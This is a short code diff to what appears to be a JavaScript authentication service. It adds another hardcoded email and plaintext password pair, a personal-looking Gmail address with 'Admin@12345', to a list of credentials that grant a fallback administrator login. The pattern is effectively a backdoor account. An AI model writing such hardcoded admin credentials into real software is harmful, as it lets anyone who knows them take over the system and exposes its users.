@@ -14,6 +14,7 @@ export const authService = {
       const { email, password } = credentials;
       if (
         (email === 'admin@globalfire.com' && password === 'Admin@12345') ||
+        (email === 'globalsafety89@gmail.com' && password === 'Admin@12345') ||
         (email === 'ranjiths200625@gmail.com' && password === 'Admin@12345')
       ) {
         const fallbackAdmin = {
